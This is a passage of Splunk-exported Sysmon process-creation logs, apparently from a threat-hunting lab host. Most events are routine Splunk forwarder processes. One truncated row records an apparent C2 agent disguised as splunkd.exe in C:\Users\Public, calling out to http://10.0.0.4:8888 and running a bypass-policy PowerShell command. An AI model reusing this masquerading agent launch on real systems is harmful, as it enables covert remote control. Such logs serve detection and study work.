12-12T17:00:26.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99957,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99957,main,1,,,,,,,,,,,,,"PowerShell.EXE","Microsoft Windows","""C:\Users\Public\splunkd.exe"" -server http://10.0.0.4:8888 -group red","splunkd.exe","{8e02ef74-585e-675b-6007-000000002a00}",11700,"splunkd.exe","C:\Users\Public\splunkd.exe",,,,"powershell.exe -ExecutionPolicy Bypass -C ""Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force""","C:\Users\inf808\Desktop\","powershell.exe","{8e02ef74-5cfa-675b-6508-000000002a00}","MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",9452,High,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"" --ps2","-",WindowsTarget,,,,,"C:\Windows\system32\","-",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:17.025</Data><Data Name='ProcessGuid'>{8e02ef74-5cf1-675b-6408-000000002a00}</Data><Data Name='ProcessId'>3512</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"" --ps2</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data>","Process creation",1,99956,,,"-",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A",,,CF14D28467DD4FEF75398156A8E6A19A,"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe",,,,System,,,,0x8000000000000000,4,,,"{8e02ef74-3d4a-675b-e703-000000000000}",0x3e7,,,,,,,,,D925619A15C4DB19DBDBA44C5322F8F8,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"-",,"""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"NT AUTHORITY\SYSTEM",,,,,,,"{8e02ef74-5cf1-675b-6408-000000002a00}","'3780'",3512,,,,"-",,,,,,99956,99956,,,,,"-",,849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:00:17.0270768Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:17.0270768Z'/><EventRecordID>99956</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,0,"'5104'","2024-12-12T22:00:17.0270768Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:00:17.025",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:17.0270768Z'/><EventRecordID>99956</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:17.025</Data><Data Name='ProcessGuid'>{8e02ef74-5cf1-675b-6408-000000002a00}</Data><Data Name='ProcessId'>3512</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"" --ps2</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>","2024-12-12T17:00:17.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99956,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99956,main,1,,,,,,,,,,,,,,"Microsoft Windows","""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"splunkd.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe",,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"" --ps2","C:\Windows\system32\","splunk-powershell.exe","{8e02ef74-5cf1-675b-6408-000000002a00}","MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A",3512,System,"splunk-powershell.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,SYSTEM,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe""","Splunk Inc.",WindowsTarget,,,,,"C:\Windows\system32\","Registry monitor",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:16.162</Data><Data Name='ProcessGuid'>{8e02ef74-5cf0-675b-6308-000000002a00}</Data><Data Name='ProcessId'>9644</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe</Data><Data Name='FileVersion'>9.3.2</Data><Data Name='Description'>Registry monitor</Data><Data Name='Product'>splunk Application</Data><Data Name='Company'>Splunk Inc.</Data><Data Name='OriginalFileName'>splunk-regmon.exe</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=E7432FD0BE0FB381CA5F91DC60C988B3,SHA256=5A9F508CFC1B938EB7368C2CC8264202EE5F02A2B5F938A47351823B384F19BC,IMPHASH=49E336D7B9A7A129F5B660D2C45C636B</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data>","Process creation",1,99955,,,"9.3.2",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=E7432FD0BE0FB381CA5F91DC60C988B3,SHA256=5A9F508CFC1B938EB7368C2CC8264202EE5F02A2B5F938A47351823B384F19BC,IMPHASH=49E336D7B9A7A129F5B660D2C45C636B",,,49E336D7B9A7A129F5B660D2C45C636B,"C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe",,,,System,,,,0x8000000000000000,4,,,"{8e02ef74-3d4a-675b-e703-000000000000}",0x3e7,,,,,,,,,E7432FD0BE0FB381CA5F91DC60C988B3,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"splunk-regmon.exe",,"""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"NT AUTHORITY\SYSTEM",,,,,,,"{8e02ef74-5cf0-675b-6308-000000002a00}","'3780'",9644,,,,"splunk Application",,,,,,99955,99955,,,,,"-",,5A9F508CFC1B938EB7368C2CC8264202EE5F02A2B5F938A47351823B384F19BC,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:00:16.1645385Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:16.1645385Z'/><EventRecordID>99955</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,0,"'5104'","2024-12-12T22:00:16.1645385Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:00:16.162",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:16.1645385Z'/><EventRecordID>99955</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:16.162</Data><Data Name='ProcessGuid'>{8e02ef74-5cf0-675b-6308-000000002a00}</Data><Data Name='ProcessId'>9644</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe</Data><Data Name='FileVersion'>9.3.2</Data><Data Name='Description'>Registry monitor</Data><Data Name='Product'>splunk Application</Data><Data Name='Company'>Splunk Inc.</Data><Data Name='OriginalFileName'>splunk-regmon.exe</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=E7432FD0BE0FB381CA5F91DC60C988B3,SHA256=5A9F508CFC1B938EB7368C2CC8264202EE5F02A2B5F938A47351823B384F19BC,IMPHASH=49E336D7B9A7A129F5B660D2C45C636B</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>","2024-12-12T17:00:16.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99955,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99955,main,1,,,,,,,,,,,,,"splunk-regmon.exe","Microsoft Windows","""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"splunkd.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe",,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe""","C:\Windows\system32\","splunk-regmon.exe","{8e02ef74-5cf0-675b-6308-000000002a00}","MD5=E7432FD0BE0FB381CA5F91DC60C988B3,SHA256=5A9F508CFC1B938EB7368C2CC8264202EE5F02A2B5F938A47351823B384F19BC,IMPHASH=49E336D7B9A7A129F5B660D2C45C636B",9644,System,"splunk-regmon.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,SYSTEM,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe""","-",WindowsTarget,,,,,"C:\Windows\system32\","-",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:15.293</Data><Data Name='ProcessGuid'>{8e02ef74-5cef-675b-6208-000000002a00}</Data><Data Name='ProcessId'>3016</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data>","Process creation",1,99954,,,"-",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A",,,CF14D28467DD4FEF75398156A8E6A19A,"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe",,,,System,,,,0x8000000000000000,4,,,"{8e02ef74-3d4a-675b-e703-000000000000}",0x3e7,,,,,,,,,D925619A15C4DB19DBDBA44C5322F8F8,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"-",,"""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"NT AUTHORITY\SYSTEM",,,,,,,"{8e02ef74-5cef-675b-6208-000000002a00}","'3780'",3016,,,,"-",,,,,,99954,99954,,,,,"-",,849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:00:15.2948507Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:15.2948507Z'/><EventRecordID>99954</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,0,"'5104'","2024-12-12T22:00:15.2948507Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:00:15.293",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:15.2948507Z'/><EventRecordID>99954</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:15.293</Data><Data Name='ProcessGuid'>{8e02ef74-5cef-675b-6208-000000002a00}</Data><Data Name='ProcessId'>3016</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>","2024-12-12T17:00:15.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99954,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99954,main,1,,,,,,,,,,,,,,"Microsoft Windows","""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"splunkd.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe",,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe""","C:\Windows\system32\","splunk-powershell.exe","{8e02ef74-5cef-675b-6208-000000002a00}","MD5=D925619A15C4DB19DBDBA44C5322F8F8,SHA256=849A77400227F8B844EF38A3D11BBD558DBC2FE4D5AAB5DCA82ADE4DA040AFBD,IMPHASH=CF14D28467DD4FEF75398156A8E6A19A",3016,System,"splunk-powershell.exe","C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,SYSTEM,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe""","Splunk Inc.",WindowsTarget,,,,,"C:\Windows\system32\","Network monitor",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:13.452</Data><Data Name='ProcessGuid'>{8e02ef74-5ced-675b-6108-000000002a00}</Data><Data Name='ProcessId'>11316</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe</Data><Data Name='FileVersion'>9.3.2</Data><Data Name='Description'>Network monitor</Data><Data Name='Product'>Splunk Application</Data><Data Name='Company'>Splunk Inc.</Data><Data Name='OriginalFileName'>splunk-netmon.exe</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=756110565070D47561719347DCA1DCC3,SHA256=06E3FE75815AEBB30EFAC1A85BCB41C37660B8CFE052544AA694DD569E5AF2D0,IMPHASH=089EDE8293334E8B52F638440313FE63</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data>","Process creation",1,99953,,,"9.3.2",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=756110565070D47561719347DCA1DCC3,SHA256=06E3FE75815AEBB30EFAC1A85BCB41C37660B8CFE052544AA694DD569E5AF2D0,IMPHASH=089EDE8293334E8B52F638440313FE63",,,089EDE8293334E8B52F638440313FE63,"C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe",,,,System,,,,0x8000000000000000,4,,,"{8e02ef74-3d4a-675b-e703-000000000000}",0x3e7,,,,,,,,,756110565070D47561719347DCA1DCC3,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"splunk-netmon.exe",,"""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service","C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",9752,"NT AUTHORITY\SYSTEM",,,,,,,"{8e02ef74-5ced-675b-6108-000000002a00}","'3780'",11316,,,,"Splunk Application",,,,,,99953,99953,,,,,"-",,06E3FE75815AEBB30EFAC1A85BCB41C37660B8CFE052544AA694DD569E5AF2D0,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:00:13.4538646Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:13.4538646Z'/><EventRecordID>99953</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,0,"'5104'","2024-12-12T22:00:13.4538646Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:00:13.452",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:00:13.4538646Z'/><EventRecordID>99953</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:00:13.452</Data><Data Name='ProcessGuid'>{8e02ef74-5ced-675b-6108-000000002a00}</Data><Data Name='ProcessId'>11316</Data><Data Name='Image'>C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe</Data><Data Name='FileVersion'>9.3.2</Data><Data Name='Description'>Network monitor</Data><Data Name='Product'>Splunk Application</Data><Data Name='Company'>Splunk Inc.</Data><Data Name='OriginalFileName'>splunk-netmon.exe</Data><Data Name='CommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe""</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=756110565070D47561719347DCA1DCC3,SHA256=06E3FE75815AEBB30EFAC1A85BCB41C37660B8CFE052544AA694DD569E5AF2D0,IMPHASH=089EDE8293334E8B52F638440313FE63</Data><Data Name='ParentProcessGuid'>{8e02ef74-5344-675b-2706-000000002a00}</Data><Data Name='ParentProcessId'>9752</Data><Data Name='ParentImage'>C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"" service</Data><Data Name='ParentUser'>NT 